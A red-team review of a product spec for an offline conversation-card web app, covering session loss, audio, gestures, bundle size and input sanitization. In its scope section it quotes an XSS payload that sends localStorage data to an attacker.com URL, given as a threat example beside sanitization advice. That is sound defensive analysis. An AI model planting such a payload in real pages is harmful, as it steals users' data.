# Red Team Adversarial Report: Skipstone Codebase Rebuild

**Target Document:** `spec/active/Draft_PRD.md`  
**Evaluation Perspective:** Distributed Client Systems, Mobile Browser Sandboxing, OWASP Security, Non-Functional Requirements (NFRs), and Reliability Engineering.

---

## 1. Introduction & Goals Analysis

* **Clarifying Questions:**
  1. How will the client application behave in locked-down or restrictive environments like iOS Safari Private Browsing mode or Firefox Strict Privacy where `ServiceWorker`, `IndexedDB`, or Web Audio may throw immediate `SecurityError` or `QuotaExceededError` exceptions upon initialization?
  2. Mobile OS kernels aggressively kill backgrounded PWA tabs under memory pressure (e.g., when a user switches to camera or answers a phone call). How does the "100% ephemeral zero-trace" model avoid destroying an active, emotionally intimate conversation if the phone screen locks or turns off for 30 seconds?

* **What-If Scenarios:**
  * *Catastrophic State Destruction on Lock Screen:* A couple is in the middle of a Level 3 prompt; one partner puts the phone face-down to speak for 3 minutes. The screen turns off, iOS Safari terminates the WebContent process due to memory management, and when unlocked, the page reloads to the Deck Selector, completely wiping their session state and context.
  * *PWA Cold Launch in Remote Airplane Mode:* A user downloads the PWA while online, travels into the wilderness, and launches the app in Airplane mode. However, fonts or chunked JavaScript lazy-routes were only registered via a stale runtime-caching rule instead of pre-cached in `install`, resulting in a blank white screen (WSOD) with no console or network fallback.

* **Points for Improvement:**
  * Mandate a fallback memory adapter: if `IndexedDB` is restricted or disabled by browser sandbox policy, fail over gracefully to a non-persistent in-memory store with clear UI notifications.
  * Define an "Active Session Recovery" window: allow short-lived ephemeral session recovery using encrypted or time-bounded `sessionStorage` (with a strict 15-minute TTL and immediate wipe on "Checkout" or "Quit") to survive accidental mobile browser tab suspensions.

---

## 2. Confidence Mandate Analysis

* **Clarifying Questions:**
  1. Why is the confidence score 9.5 / 10 when critical client edge cases—such as deck exhaustion, viewport resize during virtual keyboard emergence, and browser history gesture traps—remain completely undefined?
  2. What is the defined mathematical recovery state when a player draws all available cards in a specific tier before choosing to advance?

* **What-If Scenarios:**
  * *Infinite Card Draw Deadlock:* A group selects a small deck cohort (e.g., adult offspring with only 12 Tier 1 cards), decides to "Stay in Current Level" multiple times, and draws all 12 cards. The dealer engine attempts to select an undrawn card via a `while` loop or unhandled filter, causing an infinite loop or returning `undefined`, crashing the UI with `TypeError: Cannot read properties of undefined (reading 'speakerPrompt')`.
  * *Browser Navigation Trap:* A user instinctively swipes from the left edge of the phone screen to "go back" a card. Because browser history manipulation is unspecified, the browser navigates away from the PWA or reloads `index.html`, instantly dropping the session.

* **Points for Improvement:**
  * Lower the confidence score to reflect unaddressed state-machine boundaries (deck exhaustion, history navigation, audio unlocking).
  * Require a formal Finite State Machine (FSM) specification with exhaustive transition tables covering: `DeckExhaustion`, `SessionSuspension`, `ModalInterruption`, and `AudioNodeSuspension`.

---

## 3. Scope Analysis

* **Clarifying Questions:**
  1. What are the strict file size, payload complexity, and structural recursion limits for custom JSON deck imports?
  2. How will custom decks prevent Stored XSS and DOM-based injection attacks if prompts contain HTML, malicious markdown formatting, or encoded scripts?
  3. When an offline PWA updates its Service Worker in the background, does it force-refresh the active page, risking disruption during an intimate conversation?

* **What-If Scenarios:**
  * *Denial of Service via Malicious JSON Import:* An educator uploads a 40MB custom deck JSON file containing 50,000 recursive or malformed nodes. The browser runs `JSON.parse` and synchronous Zod schema parsing on the main thread, causing the browser UI thread to lock up completely, prompting a browser crash ("Page Unresponsive").
  * *DOM-based XSS Attack via Custom Deck:* A malicious or shared custom deck contains `<img src=x onerror="fetch('https://attacker.com/steal?data=' + localStorage.getItem('deck'))">` in the `speakerPrompt` field. If the UI uses raw `innerHTML` or unescaped markdown rendering, attacker code executes in the application's origin context.
  * *Unsolicited Service Worker SkipWaiting Interruption:* The Service Worker detects an update while a session is active and invokes `skipWaiting()` and `window.location.reload()`, abruptly reloading the page during a deep emotional reflection.

* **Points for Improvement:**
  * Enforce strict input sanitization: Custom deck imports must have an explicit byte ceiling (e.g., max 1MB payload), reject unknown fields, and render all prompt strings strictly via `textContent` or sanitized text nodes (no raw `innerHTML`).
  * Enforce non-intrusive Service Worker update semantics: Service Worker updates must install in the background and only activate on the next fresh app launch, never reloading an active session.

---

## 4. User Stories (Atomic) Analysis

* **Clarifying Questions:**
  1. *US-003 (Split Layout):* How does the dual-zone layout maintain readability on landscape viewports or ultra-compact devices (e.g. 320px width on iPhone SE) without text clipping or internal nested scrolling?
  2. *US-004 (Gestures & Audio):* How will the gesture recognizer differentiate between an intentional card swipe vs. a user adjusting their grip or scrolling down long prompt text? What is the velocity threshold and debounce window?
  3. *US-006 (Bernoulli Trials):* Independent Bernoulli trials ($P \approx 0.12$) lack variance bounding. What prevents a player from hitting 3 wildcards consecutively or experiencing a drought of 40 cards with 0 wildcards?
  4. *US-009 (Zero-Trace Privacy):* Mobile operating systems capture visual snapshots of the active screen when users switch apps. How does the app prevent sensitive cards from leaking into the OS App Switcher thumbnail preview?

* **What-If Scenarios:**
  * *Double-Swipe Accidental Card Skip:* A user with a moist finger or shaky hand makes a fast flick gesture. The touch listener fires two swipe events within 100ms, immediately skipping past a vulnerability card without giving the speaker a chance to read it, with no "Undo" or "Previous Card" mechanism available.
  * *Wildcard Clustering at High-Stakes Emotional Moments:* A couple reaches Level 3 (Deep Vulnerability) and triggers two wildcards in consecutive draws due to raw random Bernoulli variance. The sudden shift in tone breaks emotional safety and frustrates the participants.
  * *Audio Engine Crackle and OS Audio Interruption:* An incoming notification, phone call, or mute switch toggle causes the browser's `AudioContext` to enter an interrupted state (`suspended` or `interrupted`). Subsequent card draws attempt to trigger sound nodes on a dead context, throwing console errors or causing audio stuttering.

* **Points for Improvement:**
  * Add a 400ms gesture debounce window and a "Peek / Previous Card" buffer (allowing only a single step back to the immediately prior card in case of accidental swiping).
  * Replace naive Bernoulli trials with a "Smoothed Bag" or "Shuffle-Deck" distribution algorithm that guarantees minimum spacing (e.g. at least 3 standard prompts between wildcards) and bounds maximum drought intervals.
  * Implement an App-Switch Privacy Blur: listen to `visibilitychange` and blur or replace the viewport with a calming privacy splash whenever the app loses focus.

---

## 5. Technical Specifications Analysis

* **Clarifying Questions:**
  1. How will the application handle Web Audio resource reclamation? Are oscillators and gain nodes properly scheduled, disconnected, and garbage-collected after firing to avoid memory accumulation on iOS Safari?
  2. The proposed tech stack includes `zod` (~40KB minified). Given the strict `< 200KB` gzipped total budget (including bundled Inter and Outfit fonts, Tailwind CSS, and 8 prompt decks), has the bundle budget been mathematically validated?
  3. How are collisions between built-in deck IDs and user-imported custom deck IDs prevented in the store?

* **What-If Scenarios:**
  * *Web Audio Node Leaks Crashing WebKit:* Each card swipe instantiates new `OscillatorNode` and `GainNode` instances without calling `.disconnect()` after `.stop()`. Over a 60-card session, hundreds of zombie Web Audio nodes accumulate in memory, eventually triggering an audio subsystem crash in WebKit.
  * *ID Collision Overwrites Built-in Catalog:* An imported custom deck uses `id: "general_edition"`. The storage logic uses `put()` into IndexedDB or an unkeyed lookup, causing the custom deck to shadow or corrupt the canonical built-in deck.
  * *Font Loading Flash of Invisible Text (FOIT):* The app loads offline, but because font assets are loaded asynchronously without `@font-face { font-display: swap; }` or system font fallbacks, text renders completely invisible until the WOFF2 files are unpacked.

* **Points for Improvement:**
  * Implement a strict `SoundEngine` pooling and cleanup lifecycle: all nodes must be disconnected on the `onended` event callback.
  * Enforce namespace separation for custom decks: automatically prefix custom deck IDs with `custom_` (e.g., `custom_uuid`) and make the built-in catalog immutable.
  * Replace heavyweight `zod` with a lightweight, zero-dependency schema validation function or evaluate `valibot` (~1KB) to safeguard the 200KB bundle constraint.
  * Specify explicit font subsetting (Latin basic + common punctuation only) and `font-display: swap` in the Tailwind/CSS configuration.

---

## 6. Negative Constraints Analysis

* **Clarifying Questions:**
  1. The constraint states: "DO NOT use native browser `alert()` or `confirm()` dialogs." How will fatal initialization errors (e.g., Service Worker registration failure, browser storage access denied) be communicated to the user if the UI shell fails to mount?
  2. The constraint states: "DO NOT persist conversation history or answered card IDs." If the user accidentally refreshes the browser or swipes down to reload on mobile Chrome, is there any confirmation guard to prevent unintentional data loss?

* **What-If Scenarios:**
  * *Accidental Pull-to-Refresh Loss:* On mobile Chrome or Safari, a user pulls down slightly on the upper card to adjust viewport position. The browser interprets this as a native pull-to-refresh gesture, instantly reloading the page and destroying the entire conversation session.
  * *Silent Failure on Unsupported Browsers:* A user opens the PWA on an older Android WebKit browser where modern JavaScript syntax or AudioContext features fail to parse. Because native dialogs are banned and the UI shell crashes during script evaluation, the user sees a blank black screen with zero feedback.

* **Points for Improvement:**
  * Add a global CSS constraint: `overscroll-behavior: none` and `touch-action: pan-x pan-y` on the root container to disable native mobile pull-to-refresh.
  * Add a tiny vanilla fallback error boundary in `index.html` (outside the main application bundle) that injects a readable, stylized HTML error message if the core bundle fails to initialize.
  * Implement an `onbeforeunload` confirmation hook that only activates when a session is actively in progress (`cardsAnsweredInTier > 0`), prompting the user before discarding their session on accidental refresh.

---

## 7. Risks & Mitigation Analysis

* **Clarifying Questions:**
  1. Risk 3 addresses AudioContext autoplay, but what happens when the device physical hardware switch is set to "Silent" on iOS? (Web Audio via default AudioContext is muted by iOS unless an audio element hack or audio session category is configured).
  2. How does the mitigation for compact displays handle notch, dynamic island, and home indicator safe areas (`safe-area-inset-*`)?

* **What-If Scenarios:**
  * *Silent Device Suppresses All Synthesized Audio:* A user has their iPhone hardware mute switch enabled (silent mode). They tap "Sound On", but hear nothing because standard Web Audio output is routed through ambient channels muted by the ringer switch. The user assumes the sound engine is broken.
  * *Home Indicator Overlaps Action Buttons:* On modern iPhones and Android devices with gesture navigation, the bottom active listener pass indicator or checkout buttons sit directly under the system Home Indicator bar, leading to accidental app minimization when attempting to interact.

* **Points for Improvement:**
  * Include iOS Silent Switch behavior documentation and provide visual feedback for sound events (subtle chromatic pulse) so deaf or muted users still experience tactile progression.
  * Mandate explicit CSS padding utilities using `env(safe-area-inset-top)` and `env(safe-area-inset-bottom)` across all full-height viewport layouts.

---

## 8. Success Metrics Analysis

* **Clarifying Questions:**
  1. Is the `< 200KB gzipped` bundle metric achievable when bundling two distinct font families (Inter and Outfit) across multiple weights (Regular, Medium, Semi-Bold)?
  2. How will 100% test pass rate with deterministic PRNG assertions be enforced across cross-platform environments (Node/V8 vs WebKit)?

* **What-If Scenarios:**
  * *Bundle Size Blowout:* Inter (2 weights) is ~36KB compressed; Outfit (2 weights) is ~34KB compressed; 8 markdown-extracted JSON decks total ~160KB uncompressed (~45KB compressed); Tailwind base runtime is ~20KB; Application code + runtime libraries is ~50KB. The total quickly approaches or exceeds the 200KB ceiling if uncompressed assets or font variations are left unoptimized.
  * *Flaky Test Runs in CI:* PRNG tests relying on floating point modulus produce minor fractional discrepancies across different OS architectures, causing non-deterministic test failures in GitHub Actions.

* **Points for Improvement:**
  * Establish an explicit Byte Budget Breakdown in the specifications:
    - Fonts (Substituted WOFF2): $\le 60\text{KB}$
    - Decks (JSON Data): $\le 50\text{KB}$
    - App Logic & Styles: $\le 70\text{KB}$
    - Total Gzipped Ceiling: $180\text{KB}$
  * Standardize on a well-tested, integer-based seedable PRNG (e.g. Mulberry32 or SplitMix32) to guarantee identical cross-platform sequence reproduction.

---

## Final Recommendation & Next Steps

This adversarial analysis has identified critical vulnerabilities in **session resilience, audio node lifecycle, gesture debouncing, input sanitization, and bundle budgeting**.

To review and mediate these trade-offs, reconcile the architecture, and compile the final **SuperPRD and MiniPRDs**, please run:

```bash
/hyper-resolve
```
